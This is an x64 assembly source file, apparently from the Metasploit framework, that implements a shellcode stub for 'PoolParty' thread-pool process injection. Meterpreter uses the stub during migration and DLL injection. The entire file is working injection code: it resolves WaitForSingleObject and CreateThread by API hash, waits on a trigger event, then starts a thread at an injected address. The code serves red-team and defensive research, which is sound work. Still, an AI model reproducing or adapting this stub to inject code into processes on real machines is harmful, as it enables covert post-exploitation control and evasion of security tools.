;-----------------------------------------------------------------------------;
; Author: Diego Ledda (diego_ledda[at]rapid7[dot]com)
; Compatible: Windows 11, 10
; Architecture: x64
; Version: 0.4 (July 2024)
; Size: 276 bytes
; Build: >build.py poolparty
;-----------------------------------------------------------------------------;

; Stub helper for pool-party injection.

;typedef struct _POOLPARTYCTX
;{
; 	union
;	{
;		LPVOID lpStartAddress;
;		BYTE bPadding1[8]; 
;	} s;
;	union
;	{
; 	LPVOID lpParameter;
;		BYTE bPadding2[8];
;	} p;
;	union
;	{
; 	LPVOID hEventTrigger;
;		BYTE bPadding2[8];
;	} e;
; 
;} POOLPARTYCTX, * LPPOOLPARTYCTX;
; Description:
;     This stub is executed during the Meterpreter migration and DLL Injection. The POOLPARTYCTX must be allocated ALWAYS at the end of the shellcode,
;     this is mandatory as some pool-party variants doesn't support arguments passing. Also an hEventTrigger during migration is mandatory because 
;     we need to wait the ok from the previous Meterpreter to continue the execution. with other techniques (RemoteThread and APC)
;     We are starting the process in SUSPENDED mode and then Resuming it, here we need to wait for an event.
;     This shellcode is done to work with multiple PoolParty variants.
;     Supported Variants:
;             - TP Direct Insertion

[BITS 64]
[ORG 0]
  cld                      ; Clear the direction flag.
  push rbp
  push rdi
  push rsi
  mov rdi, rsp             ; Saves RSP to RDI
  jmp _parameters          ; Get the POOLPARTYCTX after the shellcode,
_cb_parameters:            ; Unluckly in some PoolParty variants we cannot receive parameters.
  pop rsi                  ; RSI = POOLPARTYCTX
  sub rsp, 0x78            ; Alloc some space on stack
  call start               ; Call start, this pushes the address of 'api_call' onto the stack.                  ;
%include "./src/block/block_api.asm" ;
start:                     
  pop rbp                  ; Pop off the address of 'api_call' for calling later.
  mov ecx, [rsi+16]        ; Get hEventTrigger
  xor rdx, rdx             ;
  dec edx                  ; Decrement rdx down to -1 (INFINITE)
  mov r10d, 0x601D8708     ; hash( "kernel32.dll", "WaitForSingleObject" )
  call rbp                 ; WaitForSingleObject(hEventTrigger, INFINITE);
  xor rdx, rdx             ; zero RDX
  mov r8, [rsi]            ; r8 = ctx->lpStartAddress
  mov r9, [rsi+8]          ; r9 = ctx->lpParameter
  xor rcx, rcx             ; Clear ECX, lpThreadAttributes
  push rcx                 ; lpThreadId 
  push rcx                 ; dwCreationFlags
  mov r10d, 0x160D6838     ; hash( "kernel32.dll", "CreateThread" )
  call rbp                 ; CreateThread( NULL, 0, ctx->lpStartAddress, ctx->lpParameter, 0, NULL );
cleanup:
  mov rsp, rdi             ; Restore Stack
  pop rsi
  pop rdi
  pop rbp
  ret
_parameters:
  call _cb_parameters      ; Simple way to get the address of the POOLPARTYCTX using the return address